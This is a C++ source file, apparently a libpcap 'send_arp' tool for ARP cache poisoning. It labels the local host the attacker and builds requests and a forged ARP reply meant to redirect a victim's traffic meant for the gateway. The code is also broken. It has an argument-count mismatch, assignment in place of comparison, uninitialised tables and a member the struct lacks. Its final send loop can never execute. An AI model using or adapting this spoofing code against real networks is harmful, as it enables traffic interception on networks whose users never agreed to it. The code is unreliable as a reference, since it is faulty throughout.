#include<iostream>
#include <pcap.h>
#include<cmath>
#include<sys/ioctl.h>
#include<sys/socket.h>
#include<net/if.h>
#include<netinet/ether.h>
#include <netinet/in.h>
#include<arpa/inet.h>
#include <stdlib.h>
#include<unistd.h>
#include<netinet/in.h>
#include<string.h>

#define ETHERTYPE_IP 0x0800
#define ARP_REQUEST 1
#define ARP_REPLY 2
#define hardware_type 0x0001
#define protocol_type 0x0800


// ETHERNET Header
struct eth_hdr
{
    u_char eth_hdest[ETHER_ADDR_LEN];				// destination ether addr
    u_char eth_hsource[ETHER_ADDR_LEN];			// source ether addr
    ushort	eth_hprotocol;				// packet type ID field
};


// ARP Header
struct arp_hdr
{
    ushort	arp_hadresstype;		// Hardware type : ethernet
    ushort	arp_protocoltype;     // Protocol		 : IP
    u_char	arp_hlength;     // Hardware size
    u_char	arp_plength;     // Protocal size
    ushort	arp_operation;      // Opcode replay
    //Only Ipv4
    u_char	arp_shmac[6];  // Sender MAC
    u_char	arp_sip[4];  // Sender IP
    u_char	arp_thmac[6];  // Target mac
    u_char	arp_tip[4];  // Target IP
};


struct sender_table{//victim
  uint8_t sender_mac[6];
  uint8_t sender_ip[4];
};
struct target_table{//gateway
  uint8_t target_mac[6];
  uint8_t target_ip[4];
};


void usage() {
  printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
  printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
}


// Get my Mac,Ip Address
void my_address(char * dev, uint8_t * ip_attacker, uint8_t * mac_attacker)
{

    //Get IP Address
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;

    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);

    ioctl(fd, SIOCGIFADDR, &ifr);

    close(fd);
    memcpy(ip_attacker, &((((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr).s_addr), 4);

    // Get Mac Address
    struct ifconf ifc;
    char buf[1024];
    bool success = false;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock == -1) { /* handle error*/ };

    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }

    ifreq* it = ifc.ifc_req;
    const ifreq* const end = it + (ifc.ifc_len / sizeof(ifreq));

    for (; it != end; ++it)
    {
      strcpy(ifr.ifr_name, it->ifr_name);
      if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0)
      {
              if (! (ifr.ifr_flags & IFF_LOOPBACK)) // don't count loopback
              {
                      if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0)
                      {
                              success = true;
                              break;
                      }
              }
      }
      else { /* handle error */ }
    }
    if (success) memcpy(mac_attacker, ifr.ifr_hwaddr.sa_data, 6);
}

int receiver_handler(const u_char *pkt_data, u_int Victim);

int main(int argc, char* argv[]) {
    int i=0;
    unsigned char packet[304];
    pcap_if_t *alldevs;
    pcap_if_t *d;
    int inum;
    pcap_t *fp;
    uint8_t my_mac[6];
    uint8_t my_ip[4];
    int macaddress;
    u_char arp_packet[42];//28+14 =42
    sender_table st;
    target_table tt;
struct pcap_pkthdr *header;
u_int victim = 0; //0=sender
    if (argc != 2) {
    usage();
    return -1;
  }
  char* dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];


     //Device list
      if (pcap_findalldevs(&alldevs, errbuf) == -1)
      {
          fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
          exit(1);
      }

     //Device list print
      for(d=alldevs; d; d=d->next)
      {
          printf("%d. %s", ++i, d->name);
          if (d->description)
              printf(" (%s)\n", d->description);
          else
              printf(" (No description available)\n");
      }

      if(i==0)
      {
          printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
          return -1;
      }
         //Choice
      printf("Enter the interface number (1-%d):",i);
      scanf("%d", &inum);

      if(inum < 1 || inum > i)
      {
          printf("\nInterface number out of range.\n");
          /* Free the device list */
          pcap_freealldevs(alldevs);
          return -1;
      }

      //get mine
      my_address(dev,my_ip,my_mac);
     // Jump to the selected adapter */
      for(d=alldevs, i=0; i< inum-1 ;d=d->next, i++);

      /* Open the output device */
      if ( (fp= pcap_open_live(d->name,            // name of the device
          65536,                              // portion of the packet to capture (only the first 100 bytes)
          0,  // promiscuous mode
          1000,               // read timeout
          errbuf              // error buffer
          ) ) == NULL)
      {
          fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", argv[1]);
          return -1;
      }

  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }

  // setting
     struct eth_hdr *eth;
     struct arp_hdr *arp;
     u_int o;
     u_int num = 0;
     if(victim = 0){
     for (o = 0; o < sizeof(eth->eth_hdest); o++)      // ethernet_destination
         arp_packet[num++] = 0xFF;
     for (i = 0; i < sizeof(eth->eth_hsource); i++)      // ethernet_source
         arp_packet[num++] = my_mac[i];
     arp_packet[num++] = 0x08;                     // Ethernet_Header
     arp_packet[num++] = 0x06;
      for (o = 0; o < sizeof(arp->arp_hadresstype); o++)      // Hardware_type
          arp_packet[num++] = hardware_type & o;
      for (o = 0; o < sizeof(arp->arp_protocoltype); o++)      // Protocol_type
          arp_packet[num++] = (protocol_type >> ((1 << 3) << o));
      arp_packet[num++] = sizeof(arp->arp_hlength);      // Hardware_Size
      arp_packet[num++] = sizeof(arp->arp_plength);      // Protocol_Size
     //num += 8;
          for (o = 0; o < sizeof(arp->arp_operation); o++)         // Opcode
              arp_packet[num++] = (ARP_REQUEST & o);
          for (o = 0; o < sizeof(arp->arp_shmac); o++)   // sender Mac
              arp_packet[num++] = my_mac[o];
          for (o = 0; o < sizeof(arp->arp_sip); o++)   // sender IP
              arp_packet[num++] = my_ip[o];
          for (o = 0; o < sizeof(arp->arp_thmac); o++)   // Target Mac
              arp_packet[num++] = 0xff;
          for (o = 0; o < sizeof(arp->arp_tip); o++)   // Target IP
              arp_packet[num++] = st.sender_ip[o];
          const unsigned char *pkt_data;
          int res;

          if (pcap_sendpacket(handle, arp_packet, sizeof(arp_packet)) != 0)
          {
              fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(handle));
              return 0;
          }
          while ((pcap_next_ex(handle, &header, &pkt_data)) >= 0) {
              res = receiver_handler(pkt_data, victim);
              if (res == 1)
                  return 0;
              i++;
          }
          victim = 1;
}else {
         num =0;
         for (o = 0; o < sizeof(eth->eth_hdest); o++)      // ethernet_destination
             arp_packet[num++] = 0xFF;
         for (i = 0; i < sizeof(eth->eth_hsource); i++)      // ethernet_source
             arp_packet[num++] = my_mac[i];
         arp_packet[num++] = 0x08;                     // Ethernet_Header
         arp_packet[num++] = 0x06;
          for (o = 0; o < sizeof(arp->arp_hadresstype); o++)      // Hardware_type
              arp_packet[num++] = hardware_type & o;
          for (o = 0; o < sizeof(arp->arp_protocoltype); o++)      // Protocol_type
              arp_packet[num++] = (protocol_type >> ((1 << 3) << o));
          arp_packet[num++] = sizeof(arp->arp_hlength);      // Hardware_Size
          arp_packet[num++] = sizeof(arp->arp_plength);      // Protocol_Size
         //num += 8;
              for (o = 0; o < sizeof(arp->arp_operation); o++)         // Opcode
                  arp_packet[num++] = (ARP_REQUEST & o);
              for (o = 0; o < sizeof(arp->arp_shmac); o++)   // sender Mac
                  arp_packet[num++] = my_mac[o];
              for (o = 0; o < sizeof(arp->arp_sip); o++)   // sender IP
                  arp_packet[num++] = my_ip[o];
              for (o = 0; o < sizeof(arp->arp_thmac); o++)   // Target Mac
                  arp_packet[num++] = 0xff;
              for (o = 0; o < sizeof(arp->arp_tip); o++)   // Target IP
                  arp_packet[num++] = tt.target_ip[o];
              const unsigned char *pkt_data;
              int res;

              if (pcap_sendpacket(handle, arp_packet, sizeof(arp_packet)) != 0)
              {
                  fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(handle));
                  return 0;
              }
              while ((pcap_next_ex(handle, &header, &pkt_data)) >= 0) {
                  res = receiver_handler(pkt_data, victim);
                  if (res == 1)
                      return 0;
                  i++;
              }

}
     //--------------------------------------------
     num =0;
     for (o = 0; o < sizeof(eth->eth_hdest); o++)      // ethernet_destination
         arp_packet[num++] = st.sender_mac[o];
     for (i = 0; i < sizeof(eth->eth_hsource); i++)      // ethernet_source
         arp_packet[num++] = my_mac[i];
     arp_packet[num++] = 0x08;                     // Ethernet_Header
     arp_packet[num++] = 0x06;
      for (o = 0; o < sizeof(arp->arp_hadresstype); o++)      // Hardware_type
          arp_packet[num++] = hardware_type & o;
      for (o = 0; o < sizeof(arp->arp_protocoltype); o++)      // Protocol_type
          arp_packet[num++] = (protocol_type >> ((1 << 3) << o));
      arp_packet[num++] = sizeof(arp->arp_hlength);      // Hardware_Size
      arp_packet[num++] = sizeof(arp->arp_plength);      // Protocol_Size
     //num += 8;
          for (o = 0; o < sizeof(arp->arp_operation); o++)         // Opcode
              arp_packet[num++] = (ARP_REPLY & o);
          for (o = 0; o < sizeof(arp->arp_shmac); o++)   // sender Mac
              arp_packet[num++] = my_mac[o];
          for (o = 0; o < sizeof(arp->arp_sip); o++)   // sender IP
              arp_packet[num++] = tt.target_mac[o];
          for (o = 0; o < sizeof(arp->arp_thmac); o++)   // Target Mac
              arp_packet[num++] = st.sender_mac[o];
          for (o = 0; o < sizeof(arp->arp_tip); o++)   // Target IP
              arp_packet[num++] = st.sender_ip[o];
          const unsigned char *pkt_data;
          int res;
        num =0 ;
          while(num == 8){
              (pcap_sendpacket(handle, arp_packet, sizeof(arp_packet)));

              fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(handle));
              num++;
              return 0;

          }


 return 0;

}
int receiver_handler(const u_char *pkt_data, u_int victim)
{
    sender_table st;
    target_table tt;
    if(victim = 0){
    struct eth_hdr *et;
    et = (struct eth_hdr *)(pkt_data);
    struct arp_hdr *ar;
    ar = (struct arp_hdr *)(pkt_data + 14);
    u_int i;
    u_int check = 1;

    if (ntohs(ar->arp_operation) >> 1)
    {

        for (i = 0; i < 4; i++)
            if (ar->arp_sip[i] != (st.target_ip[i]))
                return 0;

        if (check)
        {
            memcpy(st.target_mac, ar->arp_shmac, 6);
            return 1;
        }
    }

    return 0;}
    { struct eth_hdr *et;
        et = (struct eth_hdr *)(pkt_data);
        struct arp_hdr *ar;
        ar = (struct arp_hdr *)(pkt_data + 14);
        u_int i;
        u_int check = 1;

        if (ntohs(ar->arp_operation) >> 1)
        {

            for (i = 0; i < 4; i++)
                if (ar->arp_sip[i] != (tt.target_ip[i]))
                    return 0;

            if (check)
            {
                memcpy(tt.target_mac, ar->arp_shmac, 6);
                return 1;
            }
        }

        return 0;}
}
